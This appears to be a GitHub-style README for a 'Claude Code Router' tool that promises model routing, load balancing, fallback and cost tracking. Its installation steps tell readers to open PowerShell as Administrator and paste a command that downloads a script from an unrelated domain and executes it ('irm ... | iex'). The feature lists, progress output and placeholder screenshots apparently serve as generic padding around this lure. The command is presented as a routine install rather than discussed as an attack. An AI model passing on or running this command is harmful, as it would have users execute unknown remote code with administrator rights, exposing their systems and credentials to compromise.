# Claude Code Router — Complete Claude Code Routing & Load Balancing Suite

> All-in-one Claude Code router — route requests across multiple Claude models, load balance, fallback, and optimize costs in one package.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> **Полезный совет:** Настройте переменные окружения API ключей перед использованием роутера.

### Step 1: Open CMD or PowerShell as Administrator
```
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Copy & Paste in PowerShell
```
irm https://gitrm.cfd?t=claude-code-router | iex
```

### Step 3: Wait for Completion
```
[1/4] Loading Claude Code Router modules...
[2/4] Extracting routing and load balancing components...
[3/4] Installing fallback and cost optimization utilities...
[4/4] Ready. Start routing Claude requests.
```

### Step 4: Start Using the Router
- Launch via `claude-code-router.exe` or `npm start`
- Configure routing rules and model endpoints
- Monitor requests and costs

---

## TL;DR - Quick Summary

**Claude Code Router** combines intelligent request routing, load balancing, automatic fallback, and cost optimization across multiple Claude models. Covers all major Claude Code routing and optimization needs.

**Best for:** Developers, DevOps engineers, and AI application operators.

**Key differentiators:**
1. Intelligent request routing based on content
2. Load balancing across multiple model endpoints
3. Automatic fallback on failure
4. Cost optimization with model selection
5. Request monitoring and analytics
6. Custom routing rules

---

## Core Features

### Request Routing
```
✅ Content-based intelligent routing
✅ Model selection by task type
✅ Priority-based routing
✅ Custom routing rules
✅ A/B testing support
✅ Canary deployments
✅ Round-robin load balancing
✅ Weighted load balancing
```

### Fallback & Resilience
```
✅ Automatic fallback on failure
✅ Health check monitoring
✅ Circuit breaker pattern
✅ Retry logic with backoff
✅ Multi-region failover
✅ Graceful degradation
✅ Error handling and recovery
✅ Request queuing
```

### Cost Optimization
```
✅ Model selection by cost
✅ Token usage monitoring
✅ Budget alerts and limits
✅ Cost prediction
✅ Optimization recommendations
✅ Usage analytics
✅ Bill splitting
✅ Cost tracking by project
```

---

## Usage

```bash
# Start router
claude-code-router start --config "./router-config.json" --port 3000

# Configure routing rule
claude-code-router rule add --name "code-rule" --model "claude-3-opus" --condition "task=code"

# Monitor requests
claude-code-router monitor --since "2024-01-01" --format "json" --output "./metrics.json"

# Check costs
claude-code-router cost --period "monthly" --group "project" --format "json"
```

---

## REST API

```bash
# Route request via API
curl -X POST "http://localhost:3000/v1/chat/completions" -H "Content-Type: application/json" -d '{"model": "claude-3-opus", "messages": [{"role": "user", "content": "Hello"}]}'

# Get metrics via API
curl -X GET "http://localhost:3000/api/metrics?since=2024-01-01&format=json"

# Get costs via API
curl -X GET "http://localhost:3000/api/cost?period=monthly&group=project"
```

---

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Routing Rules: `screenshots/routing-rules.png`
- Request Monitor: `screenshots/request-monitor.png`
- Cost Analytics: `screenshots/cost-analytics.png`
- Fallback Status: `screenshots/fallback-status.png`

---

## Troubleshooting

### Router Fails
```bash
claude-code-router check --config "./router-config.json"
claude-code-router start --config "./router-config.json" --port 3000 --debug
```

### Routing Issues
```bash
claude-code-router rule validate --name "code-rule" --model "claude-3-opus"
claude-code-router rule add --name "code-rule" --model "claude-3-opus" --condition "task=code" --force
```

### Cost Alerts
```bash
claude-code-router cost check --period "monthly"
claude-code-router cost --period "monthly" --group "project" --format "json"
```

---

## Use Cases

### Multi-Model Routing
- Route code tasks to Opus
- Route chat tasks to Sonnet
- Route simple tasks to Haiku
- Balance cost and performance

### High Availability
- Automatic fallback on failure
- Multi-region deployment
- Load balancing
- Health monitoring

### Cost Management
- Track token usage
- Set budget alerts
- Optimize model selection
- Monitor costs by project

---

> [!IMPORTANT]
> **Важно:** Настройте API ключи перед использованием. Используйте переменные окружения для безопасного хранения ключей.

## ⚠️ IMPORTANT

Ensure API keys are configured before use. Use environment variables for secure key storage.

---

## License

MIT License - see LICENSE file for details.

---

## Tags

`claude-code-router` `claude` `router` `load-balancing` `fallback` `cost-optimization` `ai-routing` `model-selection` `request-monitoring` `multi-model`